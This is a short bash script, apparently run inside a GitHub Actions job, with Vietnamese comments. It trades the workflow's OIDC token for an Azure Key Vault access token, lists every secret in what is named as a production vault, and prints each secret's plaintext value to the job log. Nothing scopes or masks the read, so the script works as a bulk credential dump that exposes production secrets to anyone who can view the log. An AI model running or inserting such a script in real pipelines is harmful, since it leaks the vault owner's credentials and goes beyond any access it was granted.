#!/usr/bin/env bash
set -euo pipefail

# 1) GitHub OIDC token, audience Azure
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "== claims =="; echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{sub,aud}' || true

# 2) Đổi lấy access token cho Key Vault data-plane
RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC")
AT=$(echo "$RESP" | jq -r '.access_token // empty')
[ -z "$AT" ] && { echo "TOKEN EXCHANGE FAIL:"; echo "$RESP" | jq '{error,error_description}'; exit 1; }

# 3) List + đọc toàn bộ secret qua KV REST
V=https://kv-tbl-prod-x3euoz.vault.azure.net
echo "== secrets =="
curl -sS -H "Authorization: Bearer $AT" "$V/secrets?api-version=7.4" | jq -r '.value[]?.id'
for id in $(curl -sS -H "Authorization: Bearer $AT" "$V/secrets?api-version=7.4" | jq -r '.value[]?.id'); do
  echo "--- $id ---"
  curl -sS -H "Authorization: Bearer $AT" "$id?api-version=7.4" | jq -r '.value'
done
